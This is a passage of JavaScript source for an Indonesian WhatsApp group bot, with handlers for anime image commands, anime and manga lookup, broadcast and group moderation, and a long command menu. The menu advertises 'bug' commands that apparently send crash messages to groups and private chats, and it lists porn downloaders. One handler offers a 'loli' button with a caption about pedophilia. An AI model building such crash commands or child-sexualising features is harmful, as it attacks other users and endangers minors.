    {buttonId: `-animenom`, buttonText: {displayText: `>>`}, type: 1},
    ]
  let xx1button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Inilah dia...`,
  buttons: xxhnekobot,
  headerType: 1
  }      
            await Miku.sendMessage(m.chat, xx1button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break

case 'waifu3':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)
                           var wbuttsss = [
        {buttonId: `-waifu3`, buttonText: {displayText: `>>`}, type: 1},
        ]
      let button112ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here it is...`,
      footer: `${global.BotName}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await Miku.sendMessage(m.chat, button112ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break



case 'crossplay': case 'crosplay': 
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
                const buttons = [
        {buttonId: '-crossplay', buttonText: {displayText: '>>'}, type: 1},
            ]               
        const cosplybutton = {
        image: {url: 'https://hanzz-web.herokuapp.com/api/randomimage/cosplay'},
        caption: "Guess who am i...",
        footer: `${global.BotName}`,
        buttons: buttons,
        headerType: 4
        }
                  
        await Miku.sendMessage(m.chat,cosplybutton, { quoted:m }).catch(err => {
            return('Error!')
        })  

        break




case 'neko2':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
                var wbutsss = [
        {buttonId: `-neko2`, buttonText: {displayText: `>>`}, type: 1},
        ]
      let buttonssMessage = {
       image: {url:waifud.data.url},
       caption:  `Here it is...`,
      footer: `${global.BotName}`,
      buttons: wbutsss,
      headerType: 4
      }
            await Miku.sendMessage(m.chat,buttonssMessage, { quoted:m }).catch(err => {
                    return('Error!')
                })               
                break



case 'feed':
case 'meow':
case 'tickle':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `-${command}`, buttonText: {displayText: `>>`}, type: 1},
        ]
      let buttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here it is...`,
      footer: `${global.BotName}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await Miku.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break



/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

case 'cry':  case 'handhold':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} ${command}ed with themself!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} ${command}ed with @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break

case 'nom':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} is eating with themself!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} is eating with @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break

case 'hug':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} hugged themself!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break


case 'dance':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} is dancing alone!!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} is dancing with @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break

case 'kill': case 'pats': case 'lick': case 'kiss': case 'bite':
case 'bully': case 'bonk': case 'poke': case 'slap':
case 'happy':
case 'cuddle': case 'tendang':{

    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)	
	var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
	try {
		let messsender = m.sender
let musers=``
try {
users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

 ment=[messsender,users]
} catch {
	users == "none"
	 ment=[messsender,m.sender]
}
if(users == "none"){
     musers =`@${m.sender.split("@")[0]} ${command}ed themselves!!`
     console.log(musers)

} else {
const rcpp =`@${users.split("@"[0])}`
 musers= `@${m.sender.split("@")[0]} ${command}ed  @${users.split("@")[0]} `

console.log(musers)
}
        const response = await axios.get(pat.url,  { responseType: 'arraybuffer' })
        const buffer = Buffer.from(response.data, "utf-8")
		var fetchedgif = await GIFBufferToVideoBuffer(buffer)
		Miku.sendMessage(m.chat,{video: fetchedgif, gifPlayback:true,mentions:ment,caption:musers},{quoted:m})
    } catch (error) {
        console.log(error);
    }
}
break

case 'megumin':
if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
ud = await axios.get('https://waifu.pics/api/sfw/megumin')
var wbutsss = [
    {buttonId: `-donasi`, buttonText: {displayText: `Donet`}, type: 1},
         ]
      let buttonzMessage = {
      image: {url:ud.data.url},
       caption:  `Exoplusionnnn...`,
      footer: `${global.BotName}`,
          buttons: wbutsss,
     headerType: 4
                      }
await Miku.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break     

case 'awoo':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    reply(mess.waiting)						
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)
 var wbuttsss = [
    {buttonId: `-awoo`, buttonText: {displayText: `>>`}, type: 1},
    ]
  let button1Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here it is...`,
   footer: `${global.BotName}`,
  buttons: wbuttsss,
  headerType: 2
  }       
            await Miku.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break


case 'anime':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
	    if(!q) return reply(`Tolong ketik judul animenya!\n\n*Contoh:* ${prefix}anime naruto`)
reply(mess.waiting)							
const { Anime } =require("@shineiichijo/marika")
    const client = new Anime();
     let anime = await client.searchAnime(q)
    let result = anime.data[0];
    console.log(result)
   let details = `*Judul :* ${result.title}\n`;
    details += `*Tipe:* ${result.type}\n`;
    details += `*Status:* ${result.status.toUpperCase().replace(/\_/g, " ")}\n`;
    details += `*Total episode:* ${result.episodes}\n`;
    details += `*Durasi:* ${result.duration}\n`;
    details += `*Genre:*\n`;
    for (let i = 0; i < result.genres.length; i++) {
      details += `\t\t\t\t\t\t\t\t${result.genres[i].name}\n`;
    }
    details += `*Berdasarkan:* ${result.source.toUpperCase()}\n`;
    details += `*Studio:*\n`;
    for (let i = 0; i < result.studios.length; i++) {
      details += `\t\t\t\t\t\t\t\t${result.studios[i].name}\n`;
    }
    details += `*Producer:*\n`;
    for (let i = 0; i < result.producers.length; i++) {
      details += `\t\t\t\t\t\t\t\t\t\t${result.producers[i].name}\n`;
    }
    details += `*Tayang perdana:* ${result.aired.from}\n`;
    details += `*Berakhir pada:* ${result.aired.to}\n`;
    details += `*Popularitas:* ${result.popularity}\n`;
    details += `*Favorite:* ${result.favorites}\n`;
    details += `*Rating:* ${result.rating}\n`;
    details += `*Peringkat:* ${result.rank}\n\n`;
    if (result.trailer.url !== null)
      details += `*Trailer:* ${result.trailer.url}\n\n`;
    details += `*URL:* ${result.url}\n\n`;
    if (result.background !== null)
      details += `*Background:* ${result.background}\n\n`;
    details += `*Deskripsi:* ${result.synopsis.replace(
      /\[Written by MAL Rewrite]/g,
      ""
    )}`
Miku.sendMessage(m.chat,{image:{url:result.images.jpg.large_image_url},caption:details},{quoted:m})   
break

case 'manga':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)							
const { Manga } =require("@shineiichijo/marika")
const manga = new Manga();
if(!q) return reply(`Tolong masukkan judulnya!\n\n_Contoh:_ ${prefix}manga naruto`)
let srh = await manga.searchManga(q)
    let mang = `*Judul:* ${srh.data[0].title}\n`;
    mang += `*Status:* ${srh.data[0].status}\n`;
    mang += `*Total Volume:* ${srh.data[0].volumes}\n`;
    mang += `*Total Chapter:* ${srh.data[0].chapters}\n`;
    mang += `*Genre:*\n`;
    for (let i = 0; i < srh.data[0].genres.length; i++) {
      mang += `\t\t\t\t\t\t\t\t${srh.data[0].genres[i].name}\n`;
    }
    mang += `*Diterbitkan pada:* ${srh.data[0].published.from}\n`;
    mang += `*Skor:* ${srh.data[0].scored}\n`;
    mang += `*Popularitas:* ${srh.data[0].popularity}\n`;
    mang += `*Favorite:* ${srh.data[0].favorites}\n`;
    mang += `*Authors:*\n`;
    for (let i = 0; i < srh.data[0].authors.length; i++) {
      mang += `\t\t\t\t\t\t\t\t\t${srh.data[0].authors[i].name} (${srh.data[0].authors[0].type})\n`;
    }
    mang += `\n*URL:* ${srh.data[0].url}\n\n`;
    if (srh.data[0].background !== null)
      mang += `*Background:* ${srh.data[0].background}`;
    mang += `*Deskripsin:* ${srh.data[0].synopsis.replace(
      /\[Written by MAL Rewrite]/g,
      ""
    )}`;
Miku.sendMessage(m.chat,{image:{url:srh.data[0].images.jpg.large_image_url},caption:mang},{quoted:m})   
break



case 'waifu' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)	
    waifuddd = await axios.get('https://waifu.pics/api/sfw/waifu')
 var wbuttsssr = [
    {buttonId: `-donasi`, buttonText: {displayText: `Sedekah biar bot bisa hidup`}, type: 1},
    ]
        let button4Messagess = {
        image: {url:waifuddd.data.url},
        caption: 'Waifu kok musiman!',
        buttons: wbuttsssr,
        headerType: 4
         }     
                                  
    await Miku.sendMessage(m.chat, button4Messagess, { quoted:m }).catch(err => {
        return('error..')
        })
break

case 'neko' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)	
    waifuddd = await axios.get('https://waifu.pics/api/sfw/neko')
 var wbuttsssr = [
    {buttonId: `-neko`, buttonText: {displayText: `>>`}, type: 1},
    ]
        let buttonMessagessf = {
        image: {url:waifuddd.data.url},
        caption: 'Miow Miow...',
        buttons: wbuttsssr,
        headerType: 2
         }     
                                  
    await Miku.sendMessage(m.chat, buttonMessagessf, { quoted:m }).catch(err => {
        return('error..')
        })
break


case 'akecil' :
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
reply(mess.waiting)	
    waifuddd = await axios.get('waifu.pics')
 var wbuttsssr = [
    {buttonId: `-loli`, buttonText: {displayText: `Lanjut mhank`}, type: 1},
    ]
        let buttonMessagessfgr = {
        image: {url:waifuddd.data.url},
        caption: 'Jangan Jadi pedo kek mamat ya !',
        buttons: wbuttsssr,
        headerType: 2
         }     
                                  
    await Miku.sendMessage(m.chat, buttonMessagessfgr, { quoted:m }).catch(err => {
        return('error..')
        })
break



case "quotes":
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
var res = await Quotes()
teks = `\n*Author:* ${res.author}\n`
teks += `\n*Quotes:*\n`
teks += `${res.quotes}\n`

replay(teks)
break

case "darkjoke":
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
var res = await Darkjokes()
teks = "\n🤭"
Miku.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
break

case 'code404': case 'keluar': case 'keluargrup': case 'bye': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
        reply(mess.waiting)
                    if (!isCreator) return replay(`${mess.botowner}`)
                    await Miku.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
                break


case 'bc': case 'broadcast': case 'bcall': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
if (!isCreator) return replay(mess.botowner)
if (!args.join(" ")) return replay(`Please enter some text to broadcast! \n\nExample : ${prefix + command} ${global.OwnerName}`)
let anu = await store.chats.all().map(v => v.id)
replay(`Send Broadcast To ${anu.length} Chat\nTime's up ${anu.length * 1.5} second`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
quickReplyButton: {
displayText: '✨Menu✨',
id: '-menu'
}  
}, {
quickReplyButton: {
displayText: 'Ri',
id: '-owner'
}
}]
let txt = `「 *${global.OwnerName}'s Broadcast* 」\n\n${text}`
Miku.send5ButImg(yoi, txt, `${global.BotName}`, BotLogo, btn, Thumb)
}
replay('Broadcast Sent !')
}
break    
case 'deleteall': case 'delall': case 'delete': case 'del': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (!m.quoted) return reply('Balas Pesannya atuh!')
 let { chat, fromMe, id} = m.quoted

const key = {
    remoteJid: m.chat,
    fromMe: false,
    id: m.quoted.id,
    participant: m.quoted.sender
}

await Miku.sendMessage(m.chat, { delete: key })
 }
 break

 
case 'masukin':{     			
    if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 if (users.length == 0) return replay(`Tolong ketik nomor orang yang ingin ditambahkan`)
  await Miku.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => replay(`Orang tersebut telah ditambahkan!`)).catch((err) => replay(`Gabisa nambahin orang tersebut ke group ini!`))
 }
 break


 case "tts":  case "texttospeech":  case "say": case "speak":{
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)

    if (!args[0]) return reply("Tolong beri aku textnya biar aku bisa ngomong!")
      
      let texttosay = text
        ? text
        : m.quoted && m.quoted.text
        ? m.quoted.text
        : m.text;
      const SpeakEngine = require("google-tts-api"); 
      const texttospeechurl = SpeakEngine.getAudioUrl(texttosay, {lang: "en", slow: false, host: "https://translate.google.com",});
      Miku.sendMessage(m.chat,{audio: {url: texttospeechurl,},mimetype: "audio/mpeg",fileName: `MikuSpeechEngine.mp3`,},{quoted: m,});
    }
    break;


	case 'changelog': case 'cl': case 'clog':{
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
      
 const clog = `
╭────❲ *Changelog* ❳
│
│> *Update Terakhir*
│
│✑ ${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
│✑ ${prefix}ᴛᴇʙᴀᴋᴋᴀʟɪᴍᴀᴛ
│✑ ${prefix}ᴛᴇʙᴀᴋᴋᴀᴛᴀ
│✑ ${prefix}ʙᴜɢɢᴄ [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟷 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟸 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟹 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
│✑ ${prefix}ʟᴇᴡᴅ (Updated)
│✑ ${prefix}AnimeOnGoing
│✑ ${prefix}Scanime (WAIT)
│
│>>『  *${global.BotName}*  』<<
│
╰─────────────────⊱
`
    

 let buttonsclogm = [
    {buttonId: `-donasi`, buttonText: {displayText: 'Sedekah Seikhlasnya!'}, type: 1}
    ]
                let buttonMessage = {
                    image:fs.readFileSync('./Assets/Miuna Shiodome.png'),
                    caption: clog,
                    footer: `${BotName}`,
                    buttons: buttonsclogm,
                    headerType: 4
                    
                }
            Miku.sendMessage(m.chat, buttonMessage,{ quoted:m })
                }
	break	
	
	case 'help': case 'h': case 'helo': case 'menu': case 'allmenu': case 'listmenu':{ 
	if (isBan) return reply (`Mending Turu`)
	let text = `Silahkeun Klik Tombol Dibawah Ini..`

let buttonc = [
    {buttonId: `-awokawok ${m.sender}`, buttonText: {displayText: 'Lihat Menu!'}, type: 1},
    {buttonId: `-clog`, buttonText: {displayText: 'ChangeLog'}, type: 1}
    ]
	let buttonMessage = {
	document: fs.readFileSync('./Rimed/Ri.xlsx'),
	mimetype: docs,
	fileName: `Miuna List Menu`,
	fileLength: 99999999999999,
	caption : text,
    footer : 'Miuna',
    buttons : buttonc,
    headerType : 4,
	}
	Miku.sendMessage(m.chat, buttonMessage, {quoted : ftl})
	} 
	break

case 'awokawok':{
const text =  `
╭─❲ ❀ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ sᴇʀᴠɪᴄᴇ❀ ❳
│
│★彡 ${ucapanWaktu} Kak *${pushname}.* 彡★
│
│✑ɴᴀᴍᴀ ʙᴏᴛ : ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ
│✑sᴘᴇᴇᴅ  : ${latensie.toFixed(4)} ᴍɪʟɪᴅᴇᴛɪᴋ
│✑ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
│✑ɴᴏ. ᴏᴡɴᴇʀ : 𝟶𝟾𝟻𝟷𝟼𝟷𝟾𝟾𝟾𝟿𝟽𝟹
│✑ɴᴀᴍᴀ ᴏᴡɴᴇʀ : ᴍᴜʜᴀᴍᴍᴀᴅ ʀɪ
│✑ɴᴏᴛᴇ : ᴊɪᴋᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʙᴜɢ
│ʜᴀʀᴀᴘ ʟᴀᴘᴏʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ -ʀᴇᴘᴏʀᴛ
│   
│✑✑✑❀ ᴅᴏɴᴀᴛᴜʀ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴀɴɪᴍᴇᴏɴɢᴏɪɴɢ
│✑ ${prefix}ᴀsᴜᴘᴀɴ [ɴᴀᴍᴀ ᴄʜᴀʀᴀ]
│✑ ${prefix}ʙᴜɢɢᴄ [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟷 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟸 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʙᴜɢᴘᴍᴠ𝟹 [ʜᴀᴛɪ ʜᴀᴛɪ!!!]
│✑ ${prefix}ʜᴇɴᴛᴀɪᴍᴇɴᴜᴠ𝟸
│✑ ${prefix}ᴋᴜsᴏɴɪᴍᴇ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪ [ᴋᴏᴅᴇ]
│✑ ${prefix}ᴏᴛᴀᴋᴜᴅᴇsᴜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}sᴄᴀɴɪᴍᴇ [ғᴏᴛᴏ]
│✑ ${prefix}xɴxxsᴇᴀʀᴄʜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}xɴxxᴅʟ [ʟɪɴᴋ]
│ғɪᴛᴜʀ sᴄᴀɴɪᴍᴇ sᴀᴍᴀ sᴇᴘᴇʀᴛɪ
│ᴡʜᴀᴛ ᴀɴɪᴍᴇ ɪs ᴛʜɪs (ᴛᴇʟᴇɢʀᴀᴍ)
│ᴋᴇɢᴜɴᴀᴀɴɴʏᴀ? ɴʏᴀʀɪ ᴀɴɪᴍᴇ
│ʟᴇᴡᴀᴛ sᴇʙᴜᴀʜ ғᴏᴛᴏ
│   
│✑✑✑❀ ɢʀᴏᴜᴘ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴀɴᴛɪʟɪɴᴋ
│✑ ${prefix}ᴄʟɪɴᴋ [ᴜʙᴀʜʟɪɴᴋɢᴄ]
│✑ ${prefix}ᴅᴇʟᴇᴛᴇ [ʙᴀʟᴀs]
│✑ ${prefix}ʜɪᴅᴇᴛᴀɢ [ᴛᴇxᴛ]
│✑ ${prefix}ᴋɪᴄᴋ [ᴛᴀɢ/ʙᴀʟᴀs]
│✑ ${prefix}ᴍᴀsᴜᴋɪɴ [ɴᴏᴍᴏʀ]
│✑ ${prefix}ɴᴀɪᴋɪɴ [ᴛᴀɢ/ʙᴀʟᴀs]
│✑ ${prefix}sᴇᴛɴᴀᴍᴇ [ᴛᴇxᴛ]
│✑ ${prefix}sᴇᴛɢᴄᴘᴘ [ᴋɪʀɪᴍ ғᴏᴛᴏ]
│✑ ${prefix}sᴇᴛᴅᴇsᴄ [ᴛᴇxᴛ]
│✑ ${prefix}ᴛᴀɢᴀʟʟ [ᴛᴇxᴛ]
│✑ ${prefix}ᴛᴜʀᴜɴɪɴ [ᴛᴀɢ]
│
│✑✑✑❀ ᴛᴏʙᴀᴛ ᴍᴇɴᴜ ❀
│   
│✑ ${prefix}ɴɪᴀᴛsʜᴏʟᴀᴛ
│   
│✑✑✑❀ ɢᴀᴍᴇ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
│✑ ${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
│✑ ${prefix}ᴛᴇʙᴀᴋᴋᴀʟɪᴍᴀᴛ
│✑ ${prefix}ᴛᴇʙᴀᴋᴋᴀᴛᴀ
│✑ ${prefix}sᴜɪᴛ [ᴛᴀɢ]
│
│✑✑✑❀ ғᴜɴ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴄʜᴀʀᴀᴄʜᴇᴄᴋ [ᴛᴀɢ]
│✑ ${prefix}ᴄᴇᴋᴍᴀᴛɪ [ɴᴀᴍᴀ]
│✑ ${prefix}ᴅᴀʀᴋᴊᴏᴋᴇ
│✑ ${prefix}ɢᴀʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
│✑ ${prefix}ʜᴏʀɴʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
│✑ ${prefix}ᴋᴀᴘᴀɴᴋᴀʜ [ᴛᴇxᴛ]
│✑ ${prefix}ᴋᴇʙᴇɴᴀʀᴀɴ
│✑ ${prefix}ᴘᴇᴅᴏᴄʜᴇᴄᴋ
│✑ ${prefix}ᴘᴏʀɴʜᴜʙ [ʟᴏɢᴏ]
│✑ ${prefix}ǫᴜᴏᴛᴇs
│✑ ${prefix}ʀᴇᴀᴋsɪ
│✑ ${prefix}sᴀʏ [ᴛᴇxᴛ]
│✑ ${prefix}ᴛᴀɴᴛᴀɴɢᴀɴ
│✑ ${prefix}ᴜɢʟʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
│✑ ${prefix}ᴡᴀɴɢʏ [ᴛᴇxᴛ]
│
│✑✑✑❀ ʟɪsᴛ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ғɪʟᴍ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
│✑ ${prefix}ʟᴇᴡᴅ
│✑ ${prefix}ʟɪsᴛɢᴄ
│✑ ${prefix}ʟɪsᴛᴘᴄ
│✑ ${prefix}ᴘʀᴏғɪʟᴇ
│✑ ${prefix}ʀᴇǫᴜᴇsᴛ
│✑ ${prefix}ʀᴇᴘᴏ
│✑ ${prefix}sᴘᴇᴀᴋ [ᴛᴇxᴛ]
│✑ ${prefix}sᴄʀɪᴘᴛ
│✑ ${prefix}sᴛᴀʟᴋ
│✑ ${prefix}xɴxxsᴇᴀʀᴄʜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}xɴxxᴅʟ [ʟɪɴᴋ]
│
│✑✑✑❀ ᴏᴡɴᴇʀ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ʙᴀɴ
│✑ ${prefix}ʙᴀɴɢʀᴏᴜᴘ
│✑ ${prefix}ʙʟᴏᴄᴋ
│✑ ${prefix}ʙʀᴏᴀᴅᴄᴀsᴛ
│✑ ${prefix}ᴄᴏᴅᴇ𝟺𝟶𝟺
│✑ ${prefix}ᴊᴏɪɴ
│✑ ${prefix}ᴘᴜʙʟɪᴄ
│✑ ${prefix}sᴇʟғ
│✑ ${prefix}ᴜɴʙʟᴏᴄᴋ
│
│✑✑✑❀ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ғʙ [ʟɪɴᴋ]
│✑ ${prefix}ᴋᴜsᴏɴɪᴍᴇ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴏᴛᴀᴋᴜᴅᴇsᴜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴘʟᴀʏ [ʟɪɴᴋ]
│✑ ${prefix}ᴍᴇᴅɪᴀғɪʀᴇ [ʟɪɴᴋ/ᴊᴜᴅᴜʟ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪ [ᴋᴏᴅᴇ]
│✑ ${prefix}ᴛᴡɪᴛᴛᴇʀ [ʟɪɴᴋ]
│
│✑✑✑❀ ᴄᴏᴠᴇʀᴛ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴇᴍᴏᴊɪ [ᴇᴍᴏᴛ]
│✑ ${prefix}ᴘᴀᴛʀɪᴄᴋ [sᴛɪᴋᴇʀ]
│✑ ${prefix}ʀᴇᴠᴇʀsᴇ [ᴀᴜᴅɪᴏ]
│✑ ${prefix}sᴛɪᴄᴋᴇʀ
│✑ ${prefix}ᴛᴏᴀᴜᴅɪᴏ [ᴋɪʀɪᴍ]
│✑ ${prefix}ᴛᴏɪᴍɢ [ʙᴀʟᴀs]
│✑ ${prefix}ᴛᴏᴠɪᴅᴇᴏ [ʙᴀʟᴀs]
│✑ ${prefix}ᴛᴏᴜʀʟ [ᴋɪʀɪᴍ]
